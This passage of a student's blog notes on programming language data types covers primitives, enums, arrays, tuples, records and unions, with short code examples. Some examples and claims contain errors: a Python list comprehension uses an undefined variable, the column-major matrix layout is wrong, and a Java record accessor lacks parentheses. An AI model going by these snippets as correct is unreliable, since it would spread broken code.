<li>Flexibility</li>
<li>Storage efficiency (Dynamic storage management)</li>
</ol>
</li>
<li><p><font color="F54747"><strong>Disadvantages</strong></font>:</p>
<ol>
<li>Time-inefficient</li>
<li>Unreliable (dealing with pointers)</li>
</ol>
</li>
</ul>
</li>
</ul>
<h3 id="Implicit-Heap-Dynamic-Variables"><a href="#Implicit-Heap-Dynamic-Variables" class="headerlink" title="Implicit Heap-Dynamic Variables"></a>Implicit Heap-Dynamic Variables</h3><ul>
<li><p>Allocated and deallocated by <font color="F54747">assignment statement</font>, <font color="3A75EA">specified by the programmer</font>, which can take effect <font color="F54747">during execution</font></p>
  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> arr = [<span class="number">1</span>, <span class="string">&quot;Hello&quot;</span>, <span class="number">1.234</span>, <span class="string">&quot;World&quot;</span>]</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>Evaluation</strong>:</p>
<ul>
<li><p><font color="F54747"><strong>Advantages</strong></font>:</p>
<ol>
<li>Flexibility</li>
</ol>
</li>
<li><p><font color="F54747"><strong>Disadvantages</strong></font>:</p>
<ol>
<li>Inefficient</li>
<li>Loss of error detection</li>
</ol>
</li>
</ul>
</li>
</ul>
<!-- 
## Memory




<font color="3A75EA">Blue</font>
<font color="F54747">Red</font> -->]]></content>
      <categories>
        <category>CSCI3180</category>
      </categories>
      <tags>
        <tag>Principles</tag>
      </tags>
  </entry>
  <entry>
    <title>Data Types</title>
    <url>/myBlog/2023/02/26/2023/CSCI3180/2023-2-26-CSCI3180-DataTypes/</url>
    <content><![CDATA[<h2 id="Primitive-Data-Types"><a href="#Primitive-Data-Types" class="headerlink" title="Primitive Data Types"></a>Primitive Data Types</h2><ul>
<li>The most basic data types available in a programming language</li>
<li>Reflections of the hardware<ul>
<li>are directly related to how the computer’s hardware processes and stores data</li>
<li>primitive data types are designed to map directly to the underlying hardware of a computer (i.e., allow programs to interact with the hardware in an efficient way)</li>
</ul>
</li>
</ul>
<h3 id="Integer"><a href="#Integer" class="headerlink" title="Integer"></a>Integer</h3><ul>
<li><p>An exact reflection of the hardware</p>
</li>
<li><p>Integer sizes: platform-independent</p>
<ul>
<li><code>Java</code> signed integer sizes: <code>byte</code>(1 bytes), <code>short</code>(2 bytes), <code>int</code>(4 bytes), <code>long</code>(8 bytes)</li>
<li><code>C</code>&#x2F;<code>C++</code> signed integer sizes are not fixed</li>
<li><code>Python</code>: arbitrary sizes</li>
</ul>
</li>
</ul>
<h3 id="Floating-Point"><a href="#Floating-Point" class="headerlink" title="Floating Point"></a>Floating Point</h3><ul>
<li>Mordelling real numbers, but just approximations</li>
<li>IEEE Floating-Point Standard 754</li>
<li>Languages support at least 2 floating-point types: <code>float</code> (32 bits), <code>double</code> (64 bits)</li>
</ul>
<h3 id="Complex"><a href="#Complex" class="headerlink" title="Complex"></a>Complex</h3><ul>
<li>Some languages support a complex type (e.g., <code>Python</code>, <code>C99</code>)  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="number">1</span>+<span class="number">4j</span>) <span class="comment"># (1+4j)</span></span><br><span class="line"><span class="built_in">print</span>((<span class="number">1</span>+<span class="number">4j</span>)*(<span class="number">1</span>+<span class="number">4j</span>))    <span class="comment"># (-15+8j)</span></span><br><span class="line"><span class="built_in">print</span>(j)    <span class="comment"># not complex</span></span><br><span class="line"><span class="built_in">print</span>(j*j)  <span class="comment"># not complex</span></span><br><span class="line"><span class="built_in">print</span>(<span class="number">1j</span>*<span class="number">1j</span>)    <span class="comment"># (-1+0j)</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="Decimal"><a href="#Decimal" class="headerlink" title="Decimal"></a>Decimal</h3><ul>
<li>For business applications which involve money (e.g., <code>COBOL</code>~ essential, <code>C#</code>, <code>Python</code>)</li>
<li>It stores a fixed number of decimal digits in <font color="3A75EA">binary coded decimal</font></li>
<li><strong>Advantages</strong>:<ol>
<li>Accuracy</li>
</ol>
</li>
<li><strong>Disadvantages</strong>:<ol>
<li>Limited range</li>
<li>Memory waste</li>
</ol>
</li>
</ul>
<h3 id="Boolean"><a href="#Boolean" class="headerlink" title="Boolean"></a>Boolean</h3><ul>
<li><p><code>true</code>, <code>false</code></p>
</li>
<li><p><code>C99</code> and <code>C++</code> allow numeric expressions to be used as Boolean, but <code>Java</code> and <code>C#</code> do not because of the reliability</p>
  <figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> j = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>(j = <span class="number">1</span>)&#123;</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;GG&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>Advantages</strong>:</p>
<ol>
<li>Readability</li>
<li>Reliability</li>
</ol>
</li>
</ul>
<h3 id="Character"><a href="#Character" class="headerlink" title="Character"></a>Character</h3><ul>
<li>Stored as <font color="3A75EA">numeric codings</font> (ASCII standard and Unicode not standard)</li>
<li><font color="F54747">Noted</font>: <code>Python</code> does not have Character type (it is a string of one length)</li>
</ul>
<h3 id="Character-String-Types"><a href="#Character-String-Types" class="headerlink" title="Character String Types"></a>Character String Types</h3><ul>
<li><p>A sequences of characters</p>
</li>
<li><p><strong>Typical Operations</strong>:</p>
<ol>
<li>Assignment and copying</li>
<li>Comparasion (ascending&#x2F;descending)</li>
<li>Concatenation</li>
<li>Substring reference</li>
<li>Pattern matching</li>
</ol>
</li>
<li><p><strong>String Types in Languages</strong>:</p>
<ol>
<li><p><code>C</code> and <code>C++</code></p>
<ul>
<li>Not primitive, use char arrays and a library of functions provides operation</li>
</ul>
</li>
<li><p><code>Java</code> and <code>C#</code></p>
<ul>
<li>Not primitive, use the String class</li>
</ul>
</li>
<li><p><code>Fortran</code> and <code>Python</code></p>
<ul>
<li>Primitive type with assignment and serveral operations</li>
</ul>
</li>
<li><p><code>Perl</code> and <code>JavaScript</code></p>
<ul>
<li>Provide built-in pattern matching (regular expression)</li>
</ul>
</li>
</ol>
</li>
<li><p><strong>String Length Options</strong>:</p>
<ul>
<li><p><font color="3A75EA">Static length</font> in <code>Python</code>, <code>Java</code> String class</p>
<ul>
<li>It only need a <font color="F54747">compile-time descriptor</font> for the length</li>
</ul>
</li>
<li><p><font color="3A75EA">Limited dynamic length</font> in <code>C</code> and <code>C++</code> char arrays (<code>\0</code> indicates the end of string)</p>
<ul>
<li>It may need a <font color="F54747">run-time descriptor</font> for the length and maximum length  <figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">char</span> s1[<span class="number">3</span>] = &#123;<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>&#125;;</span><br><span class="line">    std::cout &lt;&lt; s1 &lt;&lt; std::endl;   <span class="comment">// dangerous</span></span><br><span class="line">    <span class="type">char</span> s2[<span class="number">4</span>] = &#123;<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;\0&#x27;</span>&#125;;</span><br><span class="line">    std::cout &lt;&lt; s2 &lt;&lt; std::endl;   <span class="comment">// safe</span></span><br><span class="line">    <span class="type">char</span> s3[] = <span class="string">&quot;abc&quot;</span>;</span><br><span class="line">    std::cout &lt;&lt; s3 &lt;&lt; std::endl;   <span class="comment">// safe</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Limited dynamic length</span></span><br><span class="line">    <span class="type">char</span> s4[<span class="number">20</span>] = <span class="string">&quot;hahahaha&quot;</span>;</span><br><span class="line">    std::cout &lt;&lt; s4 &lt;&lt; std::endl;   <span class="comment">// hahahaha</span></span><br><span class="line">    s4[<span class="number">8</span>] = <span class="string">&#x27;!&#x27;</span>;</span><br><span class="line">    std::cout &lt;&lt; s4 &lt;&lt; std::endl;   <span class="comment">// hahahaha!</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p><font color="3A75EA">Unlimited dynamic length</font> in <code>Perl</code></p>
<ul>
<li>It must need a <font color="F54747">run-time descriptor</font> for the length and maximum length<ol>
<li>Linked-list</li>
<li>Adjacent storage cells</li>
</ol>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="Ordinal-Types"><a href="#Ordinal-Types" class="headerlink" title="Ordinal Types"></a>Ordinal Types</h3><ul>
<li>It represents values that have a natural ordering among them</li>
<li>It is the range of possible discrete values can be easily associated with the set of integers</li>
<li>Primitive Ordinal Types:<ul>
<li><code>int</code></li>
<li><code>char</code></li>
<li><code>boolean</code></li>
</ul>
</li>
</ul>
<h2 id="Enumeration-Types"><a href="#Enumeration-Types" class="headerlink" title="Enumeration Types"></a>Enumeration Types</h2><ul>
<li><p>It allows programmers to define a set of named constants as a type</p>
</li>
<li><p>Examples:</p>
  <figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">enum</span> <span class="title class_">Day</span> &#123;MON, TUE, WED, THU, FRI, SAT, SUN&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    Day d = MON;</span><br><span class="line">    <span class="keyword">if</span>(d == MON)&#123;</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;Monday&quot;</span> &lt;&lt; std::endl; <span class="comment">// Monday</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>Issues</strong>: </p>
<ol>
<li><p>Are enumeration values coerced to other types (<code>int</code>)?</p>
 <figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">enum</span> <span class="title class_">Day</span> &#123;MON, TUE, WED, THU, FRI, SAT, SUN&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    Day d = SUN;</span><br><span class="line">    <span class="comment">// does the addition make sence? coerced to integer type</span></span><br><span class="line">    std::cout &lt;&lt; d + <span class="number">1</span> &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>Any other type coerced to an enumeration type?</p>
 <figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">enum</span> <span class="title class_">Day</span> &#123;MON, TUE, WED, THU, FRI, SAT, SUN&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    Day d = SUN;</span><br><span class="line">    <span class="comment">// can we assign integer to Day? coerced to enumeration type</span></span><br><span class="line">    d = <span class="number">123</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ol>
</li>
<li><p><strong>Evaluation</strong>:</p>
<ol>
<li><p>Aid to readability</p>
<ul>
<li>No need to code the Day, Color as a number</li>
</ul>
</li>
<li><p>Aid to reliability</p>
<ul>
<li>No enumeration variable can be assigned a value outside its defined range, so make it as compilation error</li>
<li>No invalid operations</li>
<li>No invalid coercion (<code>Java</code>, <code>C#</code> does not coerced to integer type)</li>
</ul>
</li>
</ol>
</li>
</ul>
<h2 id="Array"><a href="#Array" class="headerlink" title="Array"></a>Array</h2><ul>
<li><p>Indexing</p>
<ul>
<li>It is a mapping from indices to elements<ul>
<li>array_name (index_value_list) → one or more elements</li>
</ul>
</li>
</ul>
</li>
<li><p>Index Types</p>
<ol>
<li>Typically integers only</li>
<li>Usually starts with 0<ul>
<li><code>R</code> starts with 1</li>
</ul>
</li>
<li>Range checking<ul>
<li>In <code>Java</code>, <code>C#</code>, <code>Python</code></li>
<li>Not in <code>C</code>, <code>C++</code></li>
</ul>
</li>
<li>Some languages allow negative indices<ul>
<li><code>Python</code>: reverse</li>
</ul>
</li>
</ol>
</li>
<li><p>Initialization</p>
<ul>
<li><p>Character strings in <code>C</code> and <code>C++</code></p>
  <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> name[] = <span class="string">&quot;Doge&quot;</span>;</span><br></pre></td></tr></table></figure>
</li>
<li><p>Array of strings in <code>C</code> and <code>C++</code></p>
  <figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span>* animals [] = &#123;<span class="string">&quot;Dog&quot;</span>, <span class="string">&quot;Cat&quot;</span>, <span class="string">&quot;Pig&quot;</span>&#125;;</span><br></pre></td></tr></table></figure>
</li>
<li><p>String object in <code>Java</code></p>
  <figure class="highlight java"><table><tr><td class="code"><pre><span class="line">String[] animals = &#123;<span class="string">&quot;Dog&quot;</span>, <span class="string">&quot;Cat&quot;</span>, <span class="string">&quot;Pig&quot;</span>&#125;;</span><br></pre></td></tr></table></figure>
</li>
<li><p><code>Python</code> - list comprehension</p>
  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a_list = [x**<span class="number">2</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>) <span class="keyword">if</span> x%<span class="number">2</span> == <span class="number">0</span>]</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>Array Operations</p>
<ul>
<li><code>Python</code> supports lots of operations, access for <a href="https://donaldlamnl.github.io/myBlog/2022/08/30/2022/2022-8-30-Python-List/">details</a>.</li>
</ul>
</li>
</ul>
<h3 id="Array-Types"><a href="#Array-Types" class="headerlink" title="Array Types"></a>Array Types</h3><ol>
<li><p>Heterogeneous Array</p>
<ul>
<li>the elements in an array need not be of the same type  <figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> myArray = [<span class="string">&quot;Hello&quot;</span>, <span class="number">42</span>, <span class="literal">true</span>,</span><br><span class="line">    &#123;<span class="attr">name</span>: <span class="string">&quot;John&quot;</span>, <span class="attr">age</span>: <span class="number">30</span>&#125;,</span><br><span class="line">    <span class="keyword">function</span>(<span class="params"></span>) &#123;<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Hello from a function!&quot;</span>)&#125;</span><br><span class="line">];</span><br></pre></td></tr></table></figure>
  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">my_list = [<span class="string">&quot;hello&quot;</span>, <span class="number">42</span>, <span class="literal">True</span>,</span><br><span class="line">    &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;John&quot;</span>, <span class="string">&quot;age&quot;</span>: <span class="number">30</span>&#125;,</span><br><span class="line">    <span class="keyword">lambda</span>: <span class="built_in">print</span>(<span class="string">&quot;Hello from a lambda!&quot;</span>)</span><br><span class="line">]</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>Rectangular array:</p>
<ul>
<li>the arrays with multiple dimensions and each dimension has the same number of elements  <figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> rectangular_array[<span class="number">3</span>][<span class="number">4</span>] = &#123;&#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>&#125;, &#123;<span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>&#125;, &#123;<span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>&#125;&#125;;</span><br></pre></td></tr></table></figure>
  <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span>[][] rectangularArray = &#123;&#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>&#125;, &#123;<span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>&#125;, &#123;<span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>&#125;&#125;;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>Jagged array:</p>
<ul>
<li>the arrays with multiple dimensions but each dimension can have a different number of elements  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">jagged_array = [[<span class="number">1</span>, <span class="number">2</span>], [<span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>], [<span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>]]</span><br></pre></td></tr></table></figure>
  <figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; jagged_array = &#123;&#123;<span class="number">1</span>, <span class="number">2</span>&#125;, &#123;<span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>&#125;, &#123;<span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>&#125;&#125;;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ol>
<h3 id="Array-Binding"><a href="#Array-Binding" class="headerlink" title="Array Binding"></a>Array Binding</h3><ol>
<li><p>Static:</p>
<ul>
<li>the size of array is fixed at compiler-time</li>
<li>the array is allocated a fixed memory location at compiler-time</li>
<li><strong>Advantage</strong>: time efficiency (finish binding at compiler-time)</li>
<li><strong>Disadvantage</strong>: inflexibility (cannot change the size at runtime)</li>
</ul>
</li>
<li><p>Fixed stack-dynamic:</p>
<ul>
<li>the size of array is determined at runtime</li>
<li>the array is allocated on the stack (the memory for the array is freed when the function is returned)</li>
<li><strong>Advantage</strong>: space efficiency (the memory for the array is allocated on the stack)</li>
<li><strong>Disadvantage</strong>: inflexibility (cannot change the size at runtime)</li>
</ul>
</li>
<li><p>Fixed heap-dynamic:</p>
<ul>
<li>the size of array is dynamically bound (but fixed onece the allocation is done) <code>malloc</code></li>
<li>the array is allocated on the heap at runtime</li>
<li><strong>Advantage</strong>: flexibility (the array is allocated on the heap)</li>
<li><strong>Disadvantage</strong>: inflexibility (cannot change the size at runtime)</li>
</ul>
</li>
<li><p>Heap-dynamic:</p>
<ul>
<li>the size of array is dynamically bound</li>
<li>the array is allocated on the heap at runtime</li>
<li><strong>Advantage</strong>: highest flexibility (the size of array can be changed in runtime)</li>
<li><strong>Disadvantage</strong>: low efficiency</li>
</ul>
</li>
</ol>
<h3 id="Implementation-of-Array"><a href="#Implementation-of-Array" class="headerlink" title="Implementation of Array"></a>Implementation of Array</h3><ul>
<li><p>Access function for single-dimensioned arrays:<br>  $$\text{address}(a[i]) &#x3D; \text{address}(a[\text{lowest_bound}]) + (i - \text{lower_bound}) \times \text{sizeof}(a[i])$$</p>
<ul>
<li>Here are total 3 calculation operations</li>
</ul>
</li>
<li><p>Access multi-dimensional arrays:<br>  $$<br>  \begin{array}{ccc}<br>  a_{11} &amp; a_{12} &amp; a_{13} \\<br>  a_{21} &amp; a_{22} &amp; a_{23} \\<br>  a_{31} &amp; a_{32} &amp; a_{33}<br>  \end{array}<br>  $$</p>
<ul>
<li><p>Access function:<br>  $$<br>  \begin{aligned}<br>  \text{address}(a[i,j]) &#x3D; &amp; \space \text{address}(a[\text{lbr}, \text{lbc}]) + \\<br>                  &amp;(i-\text{lbr}) \times (\text{ubc}-\text{lbc}+1) \times \text{sizeof}(a[i,j]) + \\<br>                  &amp;(j-\text{lbc}) \times \text{sizeof}(a[i, j]) \\<br>  \end{aligned}<br>  $$</p>
<ul>
<li>$\text{lbr}$: lower-bound row index</li>
<li>$\text{lbc}$: lower-bound column index</li>
<li>$\text{ubr}$: upper-bound row index</li>
<li>$\text{ubc}$: upper-bound column index</li>
</ul>
  <!-- - $\text{lbr: lower-bound row index}$
  - $\text{lbc: lower-bound column index}$
  - $\text{ubr: upper-bound row index}$
  - $\text{ubc: upper-bound column index}$ --></li>
</ul>
<ol>
<li><p>Row major (Most languages):<br> $$<br> \begin{array}{ccc}<br> a_{11} &amp; a_{12} &amp; a_{13} &amp;<br> a_{21} &amp; a_{22} &amp; a_{23} &amp;<br> a_{31} &amp; a_{32} &amp; a_{33}<br> \end{array}<br> $$</p>
</li>
<li><p>Column major (Fortran):<br> $$<br> \begin{array}{ccc}<br> a_{11} &amp; a_{21} &amp; a_{22} &amp;<br> a_{12} &amp; a_{22} &amp; a_{32} &amp;<br> a_{13} &amp; a_{23} &amp; a_{33}<br> \end{array}<br> $$</p>
</li>
</ol>
</li>
</ul>
<h3 id="Associative-Arrays"><a href="#Associative-Arrays" class="headerlink" title="Associative Arrays"></a>Associative Arrays</h3><ul>
<li><p>In Python:</p>
  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Dictionary</span></span><br><span class="line">doge = &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;Kabosu&quot;</span>, <span class="string">&quot;gender&quot;</span>: <span class="string">&quot;Female&quot;</span>, <span class="string">&quot;age&quot;</span>: <span class="number">16</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Access</span></span><br><span class="line">doge[<span class="string">&quot;name&quot;</span>] <span class="comment"># Kabosu</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Subscripting</span></span><br><span class="line">doge[<span class="string">&quot;age&quot;</span>] = doge[<span class="string">&quot;age&quot;</span>] + <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Remove elemen</span></span><br><span class="line"><span class="keyword">del</span> doge[<span class="string">&quot;age&quot;</span>]</span><br></pre></td></tr></table></figure>
</li>
<li><p>In Perl:</p>
  <figure class="highlight perl"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Hash begins with %</span></span><br><span class="line">%temps = (<span class="string">&quot;Mon&quot;</span> =&gt; <span class="number">27</span>, <span class="string">&quot;Tue&quot;</span> =&gt; <span class="number">29</span>, <span class="string">&quot;Wed&quot;</span> =&gt; <span class="number">25</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment"># Access</span></span><br><span class="line">$temps&#123;<span class="string">&quot;Wed&quot;</span>&#125;;  <span class="comment"># 25</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Subscripting</span></span><br><span class="line">$temps&#123;<span class="string">&quot;Wed&quot;</span>&#125; = $temps&#123;<span class="string">&quot;Wed&quot;</span>&#125; + <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Remove elemen</span></span><br><span class="line"><span class="keyword">delete</span> $temps&#123;<span class="string">&quot;Tue&quot;</span>&#125;;</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="Tuples"><a href="#Tuples" class="headerlink" title="Tuples"></a>Tuples</h2><ul>
<li><p>a data type similar to a heterogeneous array, but it is immutable 不可改變的</p>
  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Declaration and Assignment</span></span><br><span class="line">t = (<span class="number">3.1415</span>, <span class="string">&quot;XD&quot;</span>, <span class="number">678</span>)</span><br><span class="line"></span><br><span class="line">t[<span class="number">0</span>] = <span class="number">3</span>  <span class="comment"># error! it is immutable</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Creating the new tuple</span></span><br><span class="line">t = t + (<span class="number">2</span>,)  <span class="comment"># (3.1415, &quot;XD&quot;, 678, 2)</span></span><br></pre></td></tr></table></figure>


</li>
<li><p>it is used in <code>Python</code>, <code>F#</code> to allow functions to return multiple values</p>
  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">f</span>(<span class="params">a,b</span>):</span><br><span class="line">    c = a + <span class="number">1</span></span><br><span class="line">    d = b * <span class="number">2</span></span><br><span class="line">    <span class="keyword">return</span>(c,d)</span><br><span class="line"></span><br><span class="line">c, d = f(<span class="number">4</span>, <span class="number">6</span>)</span><br><span class="line"><span class="built_in">print</span>(c, d)  <span class="comment"># 5, 12</span></span><br></pre></td></tr></table></figure>


</li>
<li><p>Return multiple values in <code>C++</code></p>
<ul>
<li><p>the following code can be executed but have a potential error</p>
  <figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span>* <span class="title">f2</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> result[<span class="number">2</span>];</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span>* result = <span class="built_in">f2</span>(<span class="number">1</span>,<span class="number">2</span>);</span><br><span class="line">    std::cout &lt;&lt; result[<span class="number">0</span>] &lt;&lt; result[<span class="number">1</span>] &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>When the array is returned, it would be decated to a pointer, but the <code>result</code> array is allocated on the stack, so the array is already destoried when the function is returned and the pointer returned by the function points to invalid memory.</li>
</ul>
</li>
<li><p>Solution: using the dynamic heap variables</p>
  <figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span>* <span class="title">f2</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span></span>&#123;</span><br><span class="line">    <span class="type">int</span>* result = <span class="keyword">new</span> <span class="type">int</span>[<span class="number">2</span>];</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span>* result = <span class="built_in">f2</span>(<span class="number">1</span>,<span class="number">2</span>);</span><br><span class="line">    std::cout &lt;&lt; result[<span class="number">0</span>] &lt;&lt; result[<span class="number">1</span>] &lt;&lt; std::endl;</span><br><span class="line">    <span class="keyword">delete</span>[] result;  <span class="comment">// remember to delete the pointer</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>Solution: using <code>std::pair</code> class</p>
  <figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;utility&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function">std::pair&lt;<span class="type">int</span>, <span class="type">int</span>&gt; <span class="title">f3</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span></span>&#123;</span><br><span class="line">    <span class="function">pair&lt;<span class="type">int</span>, <span class="type">int</span>&gt; <span class="title">result</span><span class="params">(a * <span class="number">3</span>, a + b)</span></span>;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    std::pair&lt;<span class="type">int</span>, <span class="type">int</span>&gt; result = <span class="built_in">f3</span>(<span class="number">3</span>, <span class="number">4</span>);</span><br><span class="line">    std::cout &lt;&lt; result.first &lt;&lt; result.second &lt;&lt; std::endl;  <span class="comment">// 9 7</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
<h2 id="Records"><a href="#Records" class="headerlink" title="Records"></a>Records</h2><ul>
<li><p>a data structure that is used to store a collection of related values</p>
</li>
<li><p>the individual elements are identified by names</p>
</li>
<li><p>In languages that support OOP, <font color="3A75EA">data classes</font> or <font color="3A75EA">record classes</font> serve as records</p>
  <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">record</span> <span class="title class_">Person</span><span class="params">(String name, <span class="type">int</span> age)</span> &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">Person</span> <span class="variable">john</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;John&quot;</span>, <span class="number">30</span>);</span><br><span class="line"></span><br><span class="line">System.out.println(john.name() + <span class="string">&quot; &quot;</span> + john.age); <span class="comment">// John 30</span></span><br></pre></td></tr></table></figure></li>
<li><p>In <code>C</code>, <code>C++</code>, <code>C#</code>, records are supported with <code>struct</code> data type</p>
  <figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> std::string;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Nice</span>&#123;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="type">float</span> f;</span><br><span class="line">    string s;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    Nice n&#123;<span class="number">1</span>, <span class="number">1.2</span>, <span class="string">&quot;haha&quot;</span>&#125;;</span><br><span class="line">    std::cout &lt;&lt; n.i &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; n.f &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; n.s &lt;&lt; std::endl;  <span class="comment">// 1 1.2 haha</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="Implement-of-Records"><a href="#Implement-of-Records" class="headerlink" title="Implement of Records"></a>Implement of Records</h3><h2 id="Unions"><a href="#Unions" class="headerlink" title="Unions"></a>Unions</h2><ul>
<li><p>user-defined data type in programming that allows storing multiple data types in the same memory location</p>
</li>
<li><p>uses the same memory location for all its members, which means that modifying one member can affect the other members</p>
</li>
<li><p>Examples:</p>
